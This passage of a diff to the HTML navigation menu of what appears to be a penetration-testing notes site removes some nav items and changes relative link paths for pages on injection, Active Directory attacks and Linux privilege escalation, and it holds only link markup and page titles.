-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Injections/NoSQL%20Injection/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    NoSQL Injection
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Injections/SQL%20Injection/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    SQL Injection
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Injections/Server-Side%20Template%20Injection%20%28SSTI%29/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Server Side Template Injection (SSTI)
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    
-    
-    
-    
-      
-      
-    
-    
-    <li class="md-nav__item md-nav__item--nested">
-      
-        
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_14" >
-        
-          
-          <label class="md-nav__link" for="__nav_4_14" id="__nav_4_14_label" tabindex="0">
-            
-  
-  
-  <span class="md-ellipsis">
-    Request Forgery
-    
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_14_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_4_14">
             <span class="md-nav__icon md-icon"></span>
             Request Forgery
           </label>
@@ -1772,7 +1840,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Request%20Forgery/Cross-Site%20Request%20Forgery%20%28CSRF%29/" class="md-nav__link">
+      <a href="../../Request%20Forgery/Cross-Site%20Request%20Forgery%20%28CSRF%29/" class="md-nav__link">
         
   
   
@@ -1795,7 +1863,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Request%20Forgery/Server%20Side%20Request%20Forgery/" class="md-nav__link">
+      <a href="../../Request%20Forgery/Server%20Side%20Request%20Forgery/" class="md-nav__link">
         
   
   
@@ -1874,7 +1942,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A4%93%20writeups/" class="md-nav__link">
+      <a href="../../../%F0%9F%A4%93%20writeups/" class="md-nav__link">
         
   
   
@@ -1938,7 +2006,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/" class="md-nav__link">
+      <a href="../../../%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/" class="md-nav__link">
         
   
   
@@ -2058,7 +2126,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/" class="md-nav__link">
         
   
   
@@ -2081,7 +2149,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/" class="md-nav__link">
         
   
   
@@ -2153,7 +2221,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Compiling%20Binaries/" class="md-nav__link">
         
   
   
@@ -2176,7 +2244,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Passive%20Network%20Recon/" class="md-nav__link">
         
   
   
@@ -2199,7 +2267,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/SQLMap/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/SQLMap/" class="md-nav__link">
         
   
   
@@ -2222,7 +2290,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/" class="md-nav__link">
         
   
   
@@ -2286,7 +2354,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/ACLs/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/ACLs/" class="md-nav__link">
         
   
   
@@ -2309,7 +2377,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Capabilities/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Capabilities/" class="md-nav__link">
         
   
   
@@ -2332,7 +2400,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Credential%20Hunting/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Credential%20Hunting/" class="md-nav__link">
         
   
   
@@ -2355,7 +2423,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Environment%20Hunting/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Environment%20Hunting/" class="md-nav__link">
         
   
   
@@ -2378,7 +2446,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/General%20Information/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/General%20Information/" class="md-nav__link">
         
   
   
@@ -2401,7 +2469,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Groups/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Groups/" class="md-nav__link">
         
   
   
@@ -2424,7 +2492,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Low-Level%20Exploits/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Low-Level%20Exploits/" class="md-nav__link">
         
   
   
@@ -2447,7 +2515,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/NFS%2C%20Samba%2C%20Network%20Shares/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/NFS%2C%20Samba%2C%20Network%20Shares/" class="md-nav__link">
         
   
   
@@ -2470,7 +2538,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Permissions/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Permissions/" class="md-nav__link">
         
   
   
@@ -2493,7 +2561,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Restricted%20Shells/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Restricted%20Shells/" class="md-nav__link">
         
   
   
@@ -2516,7 +2584,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/" class="md-nav__link">
         
   
   
@@ -2539,7 +2607,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/" class="md-nav__link">
         
   
   
@@ -2562,7 +2630,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Writable%20Directories/" class="md-nav__link">
+      <a href="../../../%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Writable%20Directories/" class="md-nav__link">
         
   
   
@@ -2649,7 +2717,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/" class="md-nav__link">
         
   
   
@@ -2713,7 +2781,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/ASREPRoast/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/ASREPRoast/" class="md-nav__link">
         
   
   
@@ -2736,7 +2804,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/" class="md-nav__link">
         
   
   
@@ -2759,7 +2827,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Hunting/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Hunting/" class="md-nav__link">
         
   
   
@@ -2782,7 +2850,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Hash%20Cracking/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Hash%20Cracking/" class="md-nav__link">
         
   
   
@@ -2805,7 +2873,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Kerberoasting/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Kerberoasting/" class="md-nav__link">
         
   
   
@@ -2877,7 +2945,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/DCShadow/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/DCShadow/" class="md-nav__link">
         
   
   
@@ -2900,7 +2968,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/DCSync/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/DCSync/" class="md-nav__link">
         
   
   
@@ -2923,7 +2991,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Diamond%20Ticket/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Diamond%20Ticket/" class="md-nav__link">
         
   
   
@@ -2946,7 +3014,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Golden%20Ticket/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Golden%20Ticket/" class="md-nav__link">
         
   
   
@@ -2969,7 +3037,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Overpass%20The%20Hash/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Overpass%20The%20Hash/" class="md-nav__link">
         
   
   
@@ -2992,7 +3060,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Pass%20The%20Hash/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Pass%20The%20Hash/" class="md-nav__link">
         
   
   
@@ -3015,7 +3083,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Pass%20The%20Ticket/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Pass%20The%20Ticket/" class="md-nav__link">
         
   
   
@@ -3038,7 +3106,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Silver%20Ticket/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Silver%20Ticket/" class="md-nav__link">
         
   
   
@@ -3110,7 +3178,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Enumerating%20Security%20Controls/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Enumerating%20Security%20Controls/" class="md-nav__link">
         
   
   
@@ -3133,7 +3201,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Powershell%20Downgrade/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Powershell%20Downgrade/" class="md-nav__link">
         
   
   
@@ -3205,7 +3273,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20User%20Enumeration/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20User%20Enumeration/" class="md-nav__link">
         
   
   
@@ -3228,7 +3296,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20Wide%20Enumeration/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20Wide%20Enumeration/" class="md-nav__link">
         
   
   
@@ -3251,7 +3319,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/" class="md-nav__link">
         
   
   
@@ -3274,7 +3342,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Group%20Membership/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Group%20Membership/" class="md-nav__link">
         
   
   
@@ -3297,7 +3365,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Host%20Enumeration/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Host%20Enumeration/" class="md-nav__link">
         
   
   
@@ -3320,7 +3388,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/" class="md-nav__link">
         
   
   
@@ -3343,7 +3411,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Password%20Policy%20Enumeration/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Password%20Policy%20Enumeration/" class="md-nav__link">
         
   
   
@@ -3415,7 +3483,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/GPP%20Password/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/GPP%20Password/" class="md-nav__link">
         
   
   
@@ -3438,7 +3506,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/IPv6%20Attacks/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/IPv6%20Attacks/" class="md-nav__link">
         
   
   
@@ -3461,7 +3529,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/" class="md-nav__link">
         
   
   
@@ -3484,7 +3552,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LNK%20File%20Attacks/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LNK%20File%20Attacks/" class="md-nav__link">
         
   
   
@@ -3507,7 +3575,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/NetNTLM%20Hash%20Stealing%20Locations/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/NetNTLM%20Hash%20Stealing%20Locations/" class="md-nav__link">
         
   
   
@@ -3530,7 +3598,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Password%20Stuff/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Password%20Stuff/" class="md-nav__link">
         
   
   
@@ -3553,7 +3621,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/PetitPotam%20%28MS-EFSRPC%29/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/PetitPotam%20%28MS-EFSRPC%29/" class="md-nav__link">
         
   
   
@@ -3576,7 +3644,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Word%20Doc%20Macro/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Word%20Doc%20Macro/" class="md-nav__link">
         
   
   
@@ -3599,7 +3667,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/ZeroLogon/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/ZeroLogon/" class="md-nav__link">
         
   
   
@@ -3671,7 +3739,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Alternate%20Service%20Name/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Alternate%20Service%20Name/" class="md-nav__link">
         
   
   
@@ -3694,7 +3762,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Constrained%20Delegation/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Constrained%20Delegation/" class="md-nav__link">
         
   
   
@@ -3717,7 +3785,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Domain%20ACLs/" class="md-nav__link">
         
   
   
@@ -3740,7 +3808,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Group%20Policy%20Abuse/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Group%20Policy%20Abuse/" class="md-nav__link">
         
   
   
@@ -3763,7 +3831,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Kerberos%20Double%20Hop/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Kerberos%20Double%20Hop/" class="md-nav__link">
         
   
   
@@ -3786,7 +3854,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/MSSQL%20Abuse/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/MSSQL%20Abuse/" class="md-nav__link">
         
   
   
@@ -3809,7 +3877,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Microsoft%20Configuration%20Manager/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Microsoft%20Configuration%20Manager/" class="md-nav__link">
         
   
   
@@ -3832,7 +3900,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Pivoting/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Pivoting/" class="md-nav__link">
         
   
   
@@ -3855,7 +3923,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Relay%20Attacks/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Relay%20Attacks/" class="md-nav__link">
         
   
   
@@ -3878,7 +3946,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Resource-Based%20Constrained%20Delegation/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Resource-Based%20Constrained%20Delegation/" class="md-nav__link">
         
   
   
@@ -3901,7 +3969,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/SMB/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/SMB/" class="md-nav__link">
         
   
   
@@ -3924,7 +3992,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Service%20for%20User%20to%20Self/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Service%20for%20User%20to%20Self/" class="md-nav__link">
         
   
   
@@ -3947,7 +4015,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Unconstrained%20Delegation/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Unconstrained%20Delegation/" class="md-nav__link">
         
   
   
@@ -4019,7 +4087,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Miscellaneous/Disable%20Restricted%20Admin%20Mode/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Miscellaneous/Disable%20Restricted%20Admin%20Mode/" class="md-nav__link">
         
   
   
@@ -4042,7 +4110,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Miscellaneous/Enable%20plaintext%20wdigest/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Miscellaneous/Enable%20plaintext%20wdigest/" class="md-nav__link">
         
   
   
@@ -4065,7 +4133,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Miscellaneous/Host%20Persistence/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Miscellaneous/Host%20Persistence/" class="md-nav__link">
         
   
   
@@ -4137,7 +4205,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Local%20Administrator%20Password%20Solution/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Local%20Administrator%20Password%20Solution/" class="md-nav__link">
         
   
   
@@ -4160,7 +4228,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/NoPac%20%28SamAccountName%20Spoofing%29/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/NoPac%20%28SamAccountName%20Spoofing%29/" class="md-nav__link">
         
   
   
@@ -4183,7 +4251,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Token%20Privileges/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Token%20Privileges/" class="md-nav__link">
         
   
   
@@ -4206,7 +4274,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/UAC%20Bypasses/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/UAC%20Bypasses/" class="md-nav__link">
         
   
   
@@ -4229,7 +4297,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Unquoted%20Service%20Path/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Unquoted%20Service%20Path/" class="md-nav__link">
         
   
   
@@ -4252,7 +4320,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Weak%20Service%20Binary%20Permissions/" class="md-nav__link">
+      <a href="../../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Weak%20Service%20Binary%20Permissions/" class="md-nav__link">
         
   
   
@@ -4275,7 +4343,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Weak%20Service%20Permissions/" class="md-nav__link">
